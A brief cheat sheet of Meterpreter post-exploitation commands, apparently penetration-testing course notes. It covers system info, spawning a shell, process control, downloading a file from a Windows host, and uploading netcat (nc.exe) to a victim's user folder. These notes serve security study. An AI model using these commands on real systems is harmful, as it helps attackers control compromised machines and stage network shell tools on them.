Common useful meterpreter commands:

`help`
`sysinfo`
`getuid`

Spawning a new shell can be usefull so that if our shell should die, like in the case of an interactive command timing out, we can exit the shell and return to the meterpreter session and just respawn a shell.
`shell`

Uploading and downloading (note the escaping):
`upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec`

`download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`

Builtin application commands:
`execute`
`ps`
`kill`

